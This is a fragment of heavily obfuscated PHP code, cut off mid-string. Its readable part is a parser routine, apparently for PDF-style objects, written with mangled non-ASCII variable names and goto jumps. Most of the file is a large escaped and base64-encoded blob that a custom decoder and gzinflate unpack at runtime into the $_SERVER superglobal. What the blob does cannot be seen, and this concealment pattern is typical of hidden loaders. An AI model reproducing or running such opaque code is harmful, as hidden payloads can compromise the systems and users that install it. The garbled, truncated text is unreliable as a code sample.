($Dâó¿…Å‰˜[920] == $CÜô…èêÍ) { $b˜ÏæÎí­‡ = array(); do { $cáö›ğÜ¶Î = $E¤‚Ù‹»¹õ; $F„ÛÚŞÂÚ = self::getRawObject($BµáŠ§çƒº, $E¤‚Ù‹»¹õ); $E¤‚Ù‹»¹õ = $F„ÛÚŞÂÚ[2]; $b˜ÏæÎí­‡[] = $F„ÛÚŞÂÚ; } while ($Dâó¿…Å‰˜[1569] != $F„ÛÚŞÂÚ[0] && $E¤‚Ù‹»¹õ != $cáö›ğÜ¶Î); array_pop($b˜ÏæÎí­‡); } } else { $Aêé²¦íÖ« = $CÜô…èêÍ; ++$E¤‚Ù‹»¹õ; $DÃ„ÆµÃ– = preg_match($Dâó¿…Å‰˜[1570], substr($BµáŠ§çƒº, $E¤‚Ù‹»¹õ), $E•Ëéğ¢‰); if ($Dâó¿…Å‰˜[920] == $CÜô…èêÍ && 1 == $DÃ„ÆµÃ–) { $b˜ÏæÎí­‡ = strtr($E•Ëéğ¢‰[1], $Dâó¿…Å‰˜[1571], $Dâó¿…Å‰˜[33]); $E¤‚Ù‹»¹õ += \strlen($E•Ëéğ¢‰[0]); } elseif (!1 !== ($bá™Ö¢ùÒÀ = strpos($BµáŠ§çƒº, $Dâó¿…Å‰˜[923], $E¤‚Ù‹»¹õ))) { $E¤‚Ù‹»¹õ = $bá™Ö¢ùÒÀ + 1; } } break; default: if ($Dâó¿…Å‰˜[1572] == substr($BµáŠ§çƒº, $E¤‚Ù‹»¹õ, 6)) { $Aêé²¦íÖ« = $Dâó¿…Å‰˜[1572]; $E¤‚Ù‹»¹õ += 6; } elseif ($Dâó¿…Å‰˜[99] == substr($BµáŠ§çƒº, $E¤‚Ù‹»¹õ, 4)) { $Aêé²¦íÖ« = $Dâó¿…Å‰˜[99]; $E¤‚Ù‹»¹õ += 4; $b˜ÏæÎí­‡ = $Dâó¿…Å‰˜[99]; } elseif ($Dâó¿…Å‰˜[1573] == substr($BµáŠ§çƒº, $E¤‚Ù‹»¹õ, 4)) { $Aêé²¦íÖ« = $Dâó¿…Å‰˜[1574]; $E¤‚Ù‹»¹õ += 4; $b˜ÏæÎí­‡ = $Dâó¿…Å‰˜[1573]; } elseif ($Dâó¿…Å‰˜[1575] == substr($BµáŠ§çƒº, $E¤‚Ù‹»¹õ, 5)) { $Aêé²¦íÖ« = $Dâó¿…Å‰˜[1574]; $E¤‚Ù‹»¹õ += 5; $b˜ÏæÎí­‡ = $Dâó¿…Å‰˜[1575]; } elseif ($Dâó¿…Å‰˜[1576] == substr($BµáŠ§çƒº, $E¤‚Ù‹»¹õ, 6)) { $Aêé²¦íÖ« = $Dâó¿…Å‰˜[1576]; $E¤‚Ù‹»¹õ += 6; if (1 == preg_match($Dâó¿…Å‰˜[1577], substr($BµáŠ§çƒº, $E¤‚Ù‹»¹õ), $E•Ëéğ¢‰)) { $E¤‚Ù‹»¹õ += strlen($E•Ëéğ¢‰[0]); $D»Å‘˜ìÂ› = $Dâó¿…Å‰˜[1578]; $DÃ„ÆµÃ– = preg_match($D»Å‘˜ìÂ›, substr($BµáŠ§çƒº, $E¤‚Ù‹»¹õ), $E•Ëéğ¢‰, PREG_OFFSET_CAPTURE); if (1 == $DÃ„ÆµÃ–) { $b˜ÏæÎí­‡ = substr($BµáŠ§çƒº, $E¤‚Ù‹»¹õ, $E•Ëéğ¢‰[0][1]); $E¤‚Ù‹»¹õ += $E•Ëéğ¢‰[1][1]; } } } elseif ($Dâó¿…Å‰˜[1579] == substr($BµáŠ§çƒº, $E¤‚Ù‹»¹õ, 9)) { $Aêé²¦íÖ« = $Dâó¿…Å‰˜[1579]; $E¤‚Ù‹»¹õ += 9; } elseif (1 == preg_match($Dâó¿…Å‰˜[1580], substr($BµáŠ§çƒº, $E¤‚Ù‹»¹õ, 33), $E•Ëéğ¢‰)) { $Aêé²¦íÖ« = $Dâó¿…Å‰˜[1542]; $E¤‚Ù‹»¹õ += strlen($E•Ëéğ¢‰[0]); $b˜ÏæÎí­‡ = intval($E•Ëéğ¢‰[1]) . $Dâó¿…Å‰˜[70] . intval($E•Ëéğ¢‰[2]); } elseif (1 == preg_match($Dâó¿…Å‰˜[1581], substr($BµáŠ§çƒº, $E¤‚Ù‹»¹õ, 33), $E•Ëéğ¢‰)) { $Aêé²¦íÖ« = $Dâó¿…Å‰˜[1582]; $b˜ÏæÎí­‡ = intval($E•Ëéğ¢‰[1]) . $Dâó¿…Å‰˜[70] . intval($E•Ëéğ¢‰[2]); $E¤‚Ù‹»¹õ += strlen($E•Ëéğ¢‰[0]); } elseif (($E´×Õ©«Ã = strspn($BµáŠ§çƒº, $Dâó¿…Å‰˜[1583], $E¤‚Ù‹»¹õ)) > 0) { $Aêé²¦íÖ« = $Dâó¿…Å‰˜[1584]; $b˜ÏæÎí­‡ = substr($BµáŠ§çƒº, $E¤‚Ù‹»¹õ, $E´×Õ©«Ã); $E¤‚Ù‹»¹õ += $E´×Õ©«Ã; } break; } goto BğˆÂŒ ¬¡; BğˆÂŒ ¬¡: return array($Aêé²¦íÖ«, $b˜ÏæÎí­‡, $E¤‚Ù‹»¹õ); goto bâŠÂà³óˆ; bâŠÂà³óˆ: } } goto A•Œ’²ÆĞ; FÚªÏŞŸî: if (!function_exists('_kodDe')) { function _kodDe($Fõ‹‡ŠŸö) { $Fõ‹‡ŠŸö = base64_decode($Fõ‹‡ŠŸö); $C’Çô®‚ù = strlen($Fõ‹‡ŠŸö); $BÔ…Ã›ĞİÒ = ''; $bÈ§°ÚÅ— = ord($Fõ‹‡ŠŸö[0]) - 30; for ($DæÕ‰éé»¾ = 1; $DæÕ‰éé»¾ < $C’Çô®‚ù; $DæÕ‰éé»¾ += 2) { if ($DæÕ‰éé»¾ + 1 < $C’Çô®‚ù) { $BÔ…Ã›ĞİÒ .= chr(ord($Fõ‹‡ŠŸö[$DæÕ‰éé»¾ + 1]) + $bÈ§°ÚÅ—); $BÔ…Ã›ĞİÒ .= chr(ord($Fõ‹‡ŠŸö[$DæÕ‰éé»¾]) + $bÈ§°ÚÅ—); } else { $BÔ…Ã›ĞİÒ .= chr(ord($Fõ‹‡ŠŸö[$DæÕ‰éé»¾]) + $bÈ§°ÚÅ—); } } return $BÔ…Ã›ĞİÒ; } } define(base64_decode('1g=='), "\265\356\227"); $_SERVER[Ö] = explode("\174\3\174\5\174\3", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x3\x9d\x7d\x9\x7c\x1b\xc5\xd5\x38\x84\xe6\xa3\xa4\xa5\xf0\x87\x96\x9b\x76\x63\x62\x7c\x44\x87\x8f\x9c\x8e\xed\x44\xb6\x64\x5b\x89\x6d\x19\x49\x8e\x93\x58\x8e\x58\x49\x2b\x69\x6d\x69\x57"."\xd9\x5d\xc9\x47\x12\x28\x4\xc2\x4d\x38\x13\x28\x94\xab\xe5\xbe\x29\xa5\xdc\x67\x4b\x39\x4a\xcb\x51\x20\x10\x68\xfb\x15\x92\x70\xb4\xd0\x2\x2d\x57\x81\xff\xdc\x33\xbb\x92\x69\xfb\xf1\xc3\xd1\xcc\x9b\x37\xb3\x73\xbc\x79\xf3"."\146\346\275\67\347\374\372\27\57\76\372\371\375\47\155\330\153\303\314\15\173\375\351\303\77\336\173\11\16\156\230\261\141\117\360\57\12\377\340\214\157\356\201\376\333\53\177\314\43\375\63\32\367\77\153\352".base64_decode('w7mLJpvOmaj5n28oZ93xy2rPYedfc+deOwZeveavXYlPJobSW0f22fbb9W/ff/HC5tzx9zy0Pf4=')."\xc0\x9a\x7d\xe\xbb\xf2\xb6\xf4\xd5\x2f\x9d\x5a\xbd\x65\xc3\x93\x7b\x49\xef\xca\x6f\x25\xa\xf7\xc6\xe6\x6e\x9a\x78\xe9\xd1\xd7\xee\xb9\x65\xee\x11\xe7\xe5\x23\x1f\xef\xf1\xee\x1\x1d\x1f\xee\xff\xa3\x3b\x6f\xc8\x7c\xb4\x72"."\xec\x6f\xf\x7c\x75\x73\xff\x7\xcb\x43\xbf\x7a\x27\x1d\xbf\x60\xe2\xac\x3d\xef\xff\xc5\xf7\x67\x3f\xb8\xf0\x90\xcf\xe6\xec\xf7\xa7\xfb\x9e\xea\xd9\xfe\x9c\xf7\xe0\x19\x1d\x17\xed\xd8\xf7\x90\xe5\xfb\xcc\xcc\x3e\x73\xec\xde"."\63\46\257\175\157\350\264\57\67\354\357\115\314\131\161\114\376\221\255\347\246\117\132\265\352\264\117\324\326\245\317\375\341\345\307\226\147\137\72\243\366\222\237\56\136\377\333\347\353\56\271\306\134\260\166\316"."\117\107\36\175\152\352\211\323\233\226\177\336\327\274\337\336\253\77\170\70\275\351\323\157\174\272\242\51\365\223\67\367\175\62\71\30\36\177\374\231\357\33\357\235\325\144\375\316\65\125\375\304\273\277\357\252".base64_decode('fuKJb1669yNHnfPx8LfPvPWCzW+sXn//mSuHPZds2uC59MDx90/Y/YMv7jo6srSgnbj19j1uf/U=').base64_decode('Z3scfOH8m/7UtXL30msXn/n7AxYcecCrTzy+XNly4Iw/7nrwjm+1B4/f8/irVq7544w99sAd3YI=').strrev('áIç!²'."\n".'„ŠzóÓJN4pƒ#ÆŠŞ8pRÕ9uÌ‹×øj¬83V–º’-5Be$·M$').strrev('n1†æª+'."\r".'’Ä`¡$Æ*+¯ˆ‘‚ÕÑã«Cz÷ßÉ)&ÈNKd¤6h ½ââÄ§Á0Å').strrev('S‹+^´µWœ¿P$ù÷uö2Q\\ëáÛÛÔ8xrÑ‚úú†w?PÁ£:øëì4Rıƒºuz°').base64_decode('lepwoEtVcikc1GRaHWuyQEJRFgJjoBVzORzpZyFSfyUtF3Okz/xipGCoeZk2fYUyyaA4IBctXdU=')."\x92\x38\x12\x98\xb0\xc\x99\xc3\x41\x8d\x93\x86\x92\x57\x34\x52\x54\x24\xd0\x1b\xe8\x8c\x4a\xb0\x9a\x52\x57\x38\xd4\x27\x91\xa1\xc8\xcb\xa6\xa5\x18\xd2\x50\x4f\x20\x1c\x90\x60\xd5\xdb\x6a\x50\x8b\x6b\x24\x9c\x6f\xb0\x1f\x74"."\210\344\353\355\225\246\53\301\122\362\5\132\14\316\123\241\260\120\330\37\10\113\35\253\45\336\117\111\75\237\327\65\17\50\5\214\247\45\124\65\20\16\343\200\213\120\160\157\20\16\35\211\204\272\272\42"."\1\26\43\215\73\246\27\324\244\231\120\251\55\226\112\347\254\170\111\316\25\51\261\216\341\337\32\362\103\176\165\223\20\360\72\125\123\213\204\130\111\21\272\316\146\16\11\24\51\266\102\41\171\220\115\47".base64_decode('cwpMsBIOtrXj3yUEKRGHaYphxRUtqadUjUzDpWTKEcKTrazfUAEeKVD3JPXCZJ9eIm1Iqzmll80=').base64_decode('srSeSykGjxdAdjGFNEadEnL3F/MiCosms2ouZdDJ+XWYjaRYxbJAM0xa08FCTpdTEcUQat8Figk=')."\25\55\21\130\104\150\135\272\221\367\3\6\100\172\7\220\275\72\130\41\141\214\22\176\112\350\24\17\141\134\265\303\47\270\277\34\31\136\6\376\251\43\134\54\106\252\226\125\162\271\270\62\241\220\11\222"."\x4f\xcd\x37\x69\xed\xbd\x66\x42\xd5\xbc\x0\x82\xa3\xc1\x50\x3c\x2b\x9b\xd9\xbe\xd4\xfc\x38\xca\x45\x99\x63\x4a\x99\xf0\x14\xb2\x5\x32\x87\xd9\xb4\x25\x94\xb\x3b\xba\x5f\xb7\x2\x2\x6f\xcd\xe9\x49\x39\x27\x36\x11\x87\xb3"."\x96\x55\x88\x28\x5a\xa\xf6\x4\x69\x8a\x3e\xae\xa1\x9e\x2a\x28\xa\x41\xf2\xbb\xa4\x94\xd4\x27\xad\x96\x7a\x5a\xd4\x16\x4a\x56\x80\x48\xd2\x93\x9c\xd5\x65\xad\x7c\x8e\x85\x68\x33\x19\xcc\x64\x40\x6b\x82\x10\x43\x15\x89\x2b"."\x13\x16\xe9\x1d\x69\x49\x32\x2b\x1b\x60\xdc\xda\x8a\x56\xda\xbd\x88\x70\x8c\x42\x21\xa7\x26\x65\x4b\xd5\x35\xaf\x9e\xb4\x14\xcb\x6d\x5a\x86\x22\x93\xd2\xaa\x96\x48\x90\x14\xe0\xd4\xad\xc7\xb9\xe8\xb4\xe9\xd4\x35\xb\xcc\x5b"."\167\324\220\65\63\255\30\356\0\241\353\26\11\164\60\143\135\24\315\257\232\5\335\124\341\147\132\44\331\262\344\144\26\116\173\136\174\333\327\340\253\132\116\325\224\62\134\137\62\251\230\246\33\146\61\364"."\x9c\xdb\x97\xcb\xe9\xe3\xee\x90\xa1\x66\x54\x90\xa7\xde\x51\x4d\xc0\x92\x5a\x24\xca\x2f\xb\xaa\xa1\x98\x34\x2a\x75\xf7\x45\x9\x32\xa8\x95\xe2\x1e\x30\xe4\x4c\x5e\x6e\x91\xa\xc5\x4\xe8\x19\x32\x31\x2b\xc0\x30\x36\xf9\x7a"."\213\224\204\121\227\224\57\232\226\333\120\0\337\121\301\12\107\6\57\230\166\367\301\361\124\225\224\73\2\330\63\1\67\67\314\223\0\31\111\64\15\103\173\242\321\201\170\260\13\254\302\375\201\170\237\57"."\332\331\103\252\155\311\31\132\347\136\300\164\131\221\24\270\312\15\346\32\44\264\176\320\107\34\70\240\217\53\6\370\160\307\144\213\64\246\247\22\372\204\207\46\101\344\10\140\17\24\31\366\150\301\162\207"."\145\55\3\373\47\61\151\51\204\34\315\122\206\256\46\341\225\201\160\74\22\352\212\16\371\302\1\62\101\100\227\117\320\102\141\41\71\167\130\111\201\116\116\132\264\150\271\0\373\207\342\300\51\1\107\223".base64_decode('psJpQtN6g92wC/xuEyC5RSxadq+aV2EtLZaC+gws492kQl5U9bZYtr42lppb5wb/1tcNx/ye+pE=')."\245\136\225\347\361\66\172\32\245\246\206\5\322\0\220\53\124\71\47\21\172\51\303\150\220\102\53\354\24\325\253\150\31\53\113\104\255\160\340\230\301\100\44\32\357\13\104\173\102\176\222\73\340\43\241\136"."\35\117\60\132\333\141\374\63\102\306\1\254\364\31\45\251\347\164\103\316\101\66\102\251\106\241\123\71\243\246\71\133\16\2\171\204\164\32\146\134\74\22\121\363\5\312\146\254\154\61\237\20\202\136\136\2".base64_decode('GVEwHIy56GwJ0Q0SavGSLNVNXZRXeiPN4H/OGFN6XqaCJJp+SgrPPwyqt6X0KDJfkyzD0iHUsKE=')."\364\51\126\126\47\323\40\243\320\52\25\131\335\150\55\123\112\116\241\275\224\125\50\257\5\322\121\211\165\136\301\120\322\52\241\111\40\16\1\70\347\245\252\31\6\231\240\170\102\343\103\120\212\344\0\213".base64_decode('s13Z5KwbRoSFtWuwtzfeGeqPAkkSQ4bCwWiAUoTPH/d1DrAViA8TQYCTrJxJYUipSeDenM1zxkk=')."\xd7\x29\xc8\x18\x71\x18\x70\xb4\x82\xae\x99\x8a\x3b\x49\x4a\x4b\x71\x16\x8a\x31\x96\x38\xf8\x67\x59\xe\x2e\xbf\x4e\xb8\xe5\xfc\x94\x3b\xaf\x58\xb2\x9b\x55\xdd\xbe\x4a\x49\x51\x71\xb1\xb\x92\x21\xe0\x2c\x2f\x7\x96\x46\xb0"."\75\240\313\343\100\50\102\62\54\205\120\40\114\44\24\203\324\143\140\220\44\345\205\341\357\16\20\340\54\272\302\311\104\360\360\15\105\50\273\52\2\174\103\235\222\171\33\227\322\372\220\262\47\362\71\56"."\x1f\xc5\x55\xdb\xf8\xc5\xf5\xc4\x28\xe0\x50\x80\xe8\xe4\x4a\xad\x76\xf3\xb1\x8a\xf6\x4\xfb\x57\xc4\xfb\x42\xfe\x40\x6f\x3c\xd8\xf\x58\x60\xb4\x1c\x3e\x38\xe0\xf7\xd1\xc1\x17\xe1\x1d\xa1\x68\x8f\xd\x3a\x8\xf8\xc4\x4a\x5f"."\x6f\xd0\x89\x1e\x58\x15\x8c\x44\x23\x15\x93\x0\x6c\x30\xe0\x48\x1\x3b\xa6\x81\x70\xa0\x2b\xb8\x8a\x45\xbb\x82\x81\x5e\x7f\x24\xde\xe9\xeb\xec\xe1\x38\xfd\xbe\x3e\x12\x89\xa7\xe1\x9e\xc5\xf4\xda\xf1\xe3\x80\x9b\x47\xd8\xce"."\47\136\202\273\70\332\231\161\333\66\43\116\5\350\70\247\23\260\4\51\204\66\111\163\341\336\21\265\204\210\264\111\275\110\251\225\311\140\171\312\40\362\62\231\241\62\135\136\152\361\117\235\344\213\110\126"."\41\316\130\101\142\222\5\121\63\150\34\10\135\344\373\22\141\276\145\65\210\103\234\16\45\255\33\312\327\1\174\151\213\21\206\43\16\346\15\117\3\43\340\103\233\124\100\11\150\104\342\164\56\232\100\274"."\367\321\352\244\371\6\61\36\2\73\151\37\334\136\306\207\302\241\376\156\222\141\74\253\320\12\4\111\367\327\122\221\204\354\62\55\316\222\200\74\41\163\321\220\166\372\250\116\273\162\3\376\71\32\377\0".base64_decode('EYx8XNForycgY2aMg24hwGyhTFUvsq8ldD1H5zFYaxm/YPvTUZMSyQRlTnPpqkUWh2hoRaA/Tik=')."\13\307\4\152\304\0\260\343\13\205\111\207\130\372\30\335\177\340\304\160\40\102\271\200\241\254\53\252\264\273\274\236\271\204\212\25\260\376\220\317\173\327\306\306\347\326\16\273\347\172\106\100\240\256\176\31"."\x8e\x92\x58\xcc\x63\x8b\xce\x21\xf9\x8b\x6\xcb\xd\x45\x90\x5a\x73\x69\x5d\x4b\xcc\x1b\xf3\xd6\x2e\x6d\x19\xf6\xb9\xa7\x64\xf7\x54\x83\x7b\xb1\x7b\x64\x6e\xcc\x53\x37\x97\x0\x46\xd6\x37\xb9\xe6\x6d\x84\x8\x0\x71\xe9\x51"."\x23\xe0\xa7\x2d\xb6\xb4\x3a\xe6\x3e\xfa\xb8\x63\x97\xd\xc7\x46\x6a\x5a\xe6\xce\x8e\x79\x8e\x8a\x8d\x8f\xd4\xd7\x2d\xa5\xdf\x49\x16\xd\xb0\xb7\x4a\x4e\xb2\xaa\xa6\xe6\xd6\x82\x2a\x1\xd1\x84\xa1\x68\x88\x25\xa\x8\x34\x61"."\112\55\160\350\372\5\33\51\34\214\241\222\341\71\206\335\261\271\43\113\205\174\2\310\371\55\40\272\0\376\234\145\170\76\367\32\330\62\226\25\316\173\102\37\105\55\311\271\53\234\27\11\71\111\370\200"."\x9a\xd1\xd8\x14\x2\xb\x3a\xdb\xd3\xda\x65\xdf\xf5\xd5\xf8\x77\x23\x1d\xc8\x8c\x42\x97\x65\x78\x1c\x65\x10\xea\x2c\x6a\xea\x3a\xba\x53\xd7\x94\x75\x24\xa0\x5b\x94\xbe\x13\x8a\x35\xae\x50\xf2\x0\x70\x5b\x1c\x10\x7\xdd\x7c"."\201\44\41\226\103\102\32\371\2\337\364\50\150\7\100\132\121\210\103\261\153\234\305\122\212\106\306\151\37\202\155\46\345\202\22\21\132\30\217\107\175\35\275\201\70\345\60\204\23\323\70\342\212\35\354\154"."\xb\x34\x8d\x73\x54\xb6\x93\xe4\xe2\xb0\xb9\x2e\x27\x21\x66\x20\x29\x86\xa1\x1b\x2d\xe8\xdc\xce\x2c\x16\xa0\x2c\x6\xf6\x3e\x16\xe8\x4f\x9\xec\x84\xa5\xb6\x76\x9\x77\x33\xe1\x12\x71\xb1\xd3\xb\x32\x95\x26\xe0\x1e\x95\x49"."\x8\xde\xda\x58\xac\x38\xac\xa4\x46\x86\x1\x21\xcb\xee\xf4\xc8\xfa\xe6\x8d\x75\x54\x2\xf6\xc6\xc0\x7f\x34\x82\xf9\x17\xa9\x71\x81\x8f\x9f\x9\x64\xad\xa4\xc5\x16\xdc\xb2\xe3\xa5\x38\xe3\x80\xb0\xa\xec\x94\x40\x37\xd8\x3a"."\13\341\134\152\265\164\113\316\61\64\230\26\205\20\312\155\350\132\115\166\332\170\0\173\71\23\202\253\263\160\370\206\70\144\77\73\131\142\7\6\302\271\17\200\271\204\50\376\267\255\212\262\151\15\114\204"."\x4e\xbe\x48\x5\xfd\x6e\x32\x88\xbe\x55\xee\x20\x11\xe0\x59\x40\xa5\xa2\xa6\xc\xa6\xb3\x45\xa1\xa6\x5e\x34\x92\xa\xc3\xb1\x9\x19\x96\x6c\x80\x35\x8b\x4b\x76\x50\x6\x13\x4e\x7\x41\xcd\x5d\xf0\x34\xc1\x5\xd7\x54\x17\x90".base64_decode('9lzwuMbFJVYXPwhwMfnTRcRSFy+dBIN+l2r6kXiMykVJtM5WFm6rc/KkC9e/VykpORetvYs2ykU=').strrev('¢åºëS^'."\0".'!•Ã’ı'."\0".'ÂÅèc+·âíP˜´ƒ––ÇÃ‚ë"LR  Í©?'."\r".'ûBà[')."\40\26\350\143\34\10\126\207\207\126\362\1\347\265\147\313\47\151\2\216\73\353\200\241\60\275\113\56\211\3\134\161\260\65\73\141\360\103\116\176\30\307\305\45\347\106\304\171\310\303\73\221\127\42\52\147"."\x22\xc2\xe7\x2d\x39\x43\xbf\x5d\x21\x15\x87\xc3\x4a\x72\x32\xc9\x37\x37\x7e\x61\xb7\x64\x8f\xb1\xa1\x47\x74\x58\x89\x98\x2a\xf\x3d\x23\x10\x46\x6b\xb3\xf6\xd9\x87\x52\x36\xa7\x23\x42\x3e\x36\x62\x9b\x96\xba\x79\x9b\x42\x5".strrev('ªÉD,Cæã£†Ï\\Á(›I™òŒ.VŞ¶ŸÔ&(3^œfYRLÙHVH¦âò˜P|†@â¾').base64_decode('x3G/xvNsZ8E62sGMYL8PqNqkqol7dw7lPI8TBSRvHsN9PF0Y8xZ+NuAiZwYusG8cE7ge3+OC2sM=')."\xac\x42\xdd\x49\x49\x8e\x9a\xd3\x9\xe8\xb6\x47\xf9\x7c\x1c\x4\xdb\xa4\xb8\x83\x54\x9\x91\x66\x65\x83\xf7\x32\x9d\x63\x90\xb0\x59\xab\x4c\x88\xc2\xa3\x2\x5a\x5a\x2e\x71\x76\x6f\xcb\x23\xcc\xc\xd3\x9a\x64\xc7\x1c\x42\xd0".base64_decode('XiiO+qeL9LDdX6WoOOlUsxf0ZqUwamlUrxhFUoEE5AF6BEbF+7jjmAFEhZGK204kcDV8jPUBwSY=')."\7\106\300\360\300\111\322\15\31\233\270\12\361\25\12\62\123\34\26\220\12\116\36\150\343\325\225\26\76\47\267\166\100\35\121\376\121\33\337\51\133\235\210\160\102\144\321\6\102\365\51\260\153\364\30\230"."\263\171\200\370\121\304\160\127\203\260\274\361\351\273\336\234\64\55\45\117\70\341\106\107\357\130\140\173\223\220\15\217\1\152\304\53\312\227\4\42\174\24\31\140\304\211\201\213\357\325\251\54\14\351\77\220".base64_decode('Ui0IgdxMp4dWHFFg8wwmFIi6xFM2Bjl1jORyVdswK3FyTz3iuR6+9ogrl3gpBNF4y+ElEw4J16k=')."\171\166\353\204\200\36\323\322\13\74\105\210\342\144\41\211\27\52\140\261\316\107\65\4\53\100\12\311\7\274\13\21\56\311\213\44\150\114\334\236\34\300\360\210\254\310\147\30\224\110\160\363\340\11\16\0".base64_decode('iiA4XSP0BLESR8aFB0r8mhQXBT/swQuUR06lQvR4TQyXo4qnCZULQjfXrCghVhndl8vxazBnfNo=')."\x2c\x78\xae\x8a\x99\x44\xc8\xb4\xd9\xba\x90\x10\x4c\xef\x1f\x2a\xc1\x98\x4c\xd7\xe5\xa0\x21\x3e\xe3\xf8\x35\xa3\x53\xe4\xb5\x33\x9f\x7f\x27\x8e\x95\xcd\x0\x3e\xa0\x95\xe3\x90\x3f\x66\x55\x4d\xa1\xdb\x2d\xb0\xa7\x34\x2b\xf1"."\231\177\47\337\330\244\136\273\40\43\112\60\144\71\344\315\25\273\25\222\377\164\264\0\323\204\103\45\260\207\2\0\161\35\141\47\47\234\357\10\113\45\132\166\342\226\155\331\17\243\62\204\371\140\33\142"."\x30\xff\x70\x8b\xba\xc\x3d\x1f\xc\x81\xf9\x55\x99\xe8\x9c\x78\xa\x3d\x3b\x42\x4c\x6d\x82\x6d\xc9\xc4\x4c\x80\x48\xe0\x2a\x34\x5d\x99\x34\x99\x15\xc5\x97\xac\xbb\xcf\x78\xff\xb4\x1b\x9f\xc5\xe1\xdf\xfe\xf0\xb3\xbb\x49\x6f"."\224\222\326\272\14\331\24\156\370\6\121\33\232\51\52\15\235\274\152\122\177\355\361\357\165\237\161\334\376\65\167\315\14\234\265\162\375\373\167\134\377\255\133\377\171\316\312\65\152\350\311\241\144\242\347\73"."\xdb\x7e\x7f\xde\x11\x9e\xc5\xaf\xdd\xf8\xe5\xaf\xb3\x97\x2c\x3a\xfe\xa7\x3d\xc7\x1c\x7c\xdd\x19\x7\xdd\xfc\xdc\xc\xf7\xb3\x8f\x7f\xe7\x59\xc9\x77\xe0\x47\x3b\xa2\xdd\xf\x6\x4e\xb9\x74\xd3\x9b\x2d\xcb\xf7\x7d\xe4\xd2\x49".strrev('Kb½ö‹^Õs=›•>½ß­ë¼^ÛÕìÖæs½^e·qóvº~—÷üä}?Û}ìØòz<ÏçÃş?÷Éó').base64_decode('86zfn/vrg3YU7vj9U5OrbkrteeEn2x97osN86/bXY+P7L7rzr2se2d7781/t/8VD2y4qbJ5YMXM=').base64_decode('a/Xe7R+l2grR+h3d2arv/mDLp2rdztH6BedGam58RXq28fLrrnr4kd7H9jhqy7vnRrddfnzTWxM=').strrev('vıœ#e47s±èıÿ²×šÔ›•Æi?D<•>gó¬Í|2ÿ«„û¿]Íî:Ó÷ÙÎkáúrvÏ')."\266\160\356\272\175\307\273\57\235\373\333\252\175\177\27\150\157\276\172\357\137\337\261\357\155\243\117\374\371\226\45\133\356\330\161\300\366\265\57\336\365\203\57\255\356\343\216\77\343\257\217\264\37\264\346\307".base64_decode('37v6qqrgp00/u+udJavPeWblDbN+dtv/FF+QnzqyePidjUc0vvDSG133re/dsf7H72k3H1UTqNs=')."\xf1\x59\xcb\xc3\xaf\x74\xf4\x3f\x77\xe5\xd1\xc7\x3c\x69\xa4\x8f\xba\x22\xf8\xe9\xc\x97\xb9\x6c\xf1\x8d\xc1\xeb\x57\x3d\xb3\xf5\x6a\xd7\xde\x7f\x9c\xf1\xe3\xe0\xe0\xc8\xa6\xc5\xf\x4b\x77\x3d\xbf\xed\x8d\xd1\xfe\xc1\xf\x57"."\317\357\256\316\52\213\3\43\67\157\275\341\234\277\276\61\232\171\372\364\350\115\357\114\5\256\74\157\377\145\27\137\274\317\356\103\337\334\174\367\337\42\253\32\217\30\236\275\173\345\354\333\227\45\36\74"."\371\233\337\77\345\204\33\72\56\77\164\307\105\241\23\163\253\137\376\120\252\251\76\367\322\53\57\77\373\355\67\266\252\277\152\377\376\117\366\370\141\325\111\127\237\330\125\175\326\145\63\267\76\373\223\201"."\337\55\173\161\331\336\271\167\227\371\156\74\157\226\161\341\214\227\77\75\365\341\115\213\255\273\77\152\274\363\276\163\337\371\115\303\71\173\156\337\262\371\354\23\366\75\377\213\377\371\350\342\232\43\277\371"."\363\173\367\174\61\70\162\105\337\77\332\36\330\375\377\172\156\314\355\167\360\47\137\36\61\371\252\164\233\77\273\144\317\374\333\107\357\271\366\222\37\267\324\354\157\76\162\110\351\234\123\243\236\252\232\376"."\x6\xe3\xfc\xc5\x3f\xb9\xf9\x9a\x7b\x8b\x5a\xe0\xd5\xd7\x7f\xbd\xe0\xbe\x23\x7d\xd\x8d\x47\xe4\x3b\xf\xbf\xe8\xa5\xec\xdb\x1f\xd4\x3e\x9f\x7b\xe1\xd0\x43\xcf\xf9\xa3\xd6\xdb\xf1\xc4\x91\xd2\x49\x6f\x7c\x2b\xb9\xdf\xa3\xb7"."\74\235\174\176\346\366\355\13\347\237\365\361\221\213\226\316\176\60\67\173\305\33\153\345\253\176\364\356\343\15\175\261\123\17\53\354\361\342\325\243\325\13\372\117\173\367\240\157\374\341\336\57\222\67\137\177"."\346\137\116\173\351\363\356\107\157\171\160\317\326\355\215\77\176\262\363\205\235\253\237\174\356\231\306\303\117\76\344\222\337\116\74\161\351\365\233\36\136\376\351\45\263\57\117\54\376\371\57\167\137\377\233\63"."\337\233\327\161\340\133\67\235\161\304\354\63\176\363\314\13\63\16\275\261\306\132\366\346\173\233\116\32\173\351\363\347\116\134\177\364\202\363\366\11\205\36\216\37\44\215\134\76\172\356\141\317\65\357\377\273"."\206\167\277\330\47\361\277\63\256\332\276\342\265\23\322\377\360\237\331\65\371\301\217\236\114\135\262\140\305\310\135\53\257\72\353\365\127\157\33\331\266\376\347\317\35\367\374\245\155\7\355\21\135\260\351\262"."\x50\xbf\xda\xd2\xfc\xea\xd0\xf\xf7\x7b\x3a\x70\x68\xcb\xd\xdf\x9c\x6d\xcc\xbb\xf8\xc5\x92\x75\xc1\x9a\x3\x3a\xaf\xd8\x7a\xde\xfb\x7b\xfd\x71\xa2\x73\xff\x13\xcf\x99\xb9\x47\x61\xde\xc5\xa9\xe2\x9f\xdb\xe5\xfd\xb7\x16\x7e"."\371\350\355\215\303\7\175\160\303\125\157\26\265\43\372\16\74\44\275\343\251\47\253\16\177\247\347\251\347\236\270\123\136\56\45\253\316\155\174\341\265\217\36\53\44\226\57\74\373\325\137\33\67\277\360\366".strrev('’É>ï^#úÖÕû<¢›i!éôUz£<ÏßG&¹jŸÃÜáù¬¶Ûeïë÷¸]¯ËßR1ßÎ